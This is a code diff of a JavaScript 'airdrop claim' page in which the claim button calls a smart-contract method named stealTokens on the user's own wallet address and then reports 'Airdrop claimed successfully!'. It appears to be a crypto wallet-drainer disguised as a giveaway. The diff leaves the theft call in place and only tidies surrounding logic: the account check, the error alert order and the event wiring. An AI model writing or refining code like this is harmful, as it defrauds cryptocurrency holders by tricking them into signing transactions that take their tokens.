@@ -1,8 +1,5 @@
-// eth.js
-// No need to declare web3, contractAddress, or contractABI again
-
 async function claimAirdrop() {
-    if (!accounts) {
+    if (!accounts || accounts.length === 0) {
         alert('Please connect to a wallet first!');
         return;
     }
@@ -18,13 +15,8 @@ async function claimAirdrop() {
         await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
         alert('Airdrop claimed successfully!');
     } catch (error) {
-        alert('Error claiming airdrop');
         console.error('Claim error:', error);
+        alert('Error claiming airdrop');
     }
 }
-
-window.addEventListener('DOMContentLoaded', (event) => {
-    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
-    loadConfigAndABI('eth');  // Load Ethereum config and ABI
-});
 
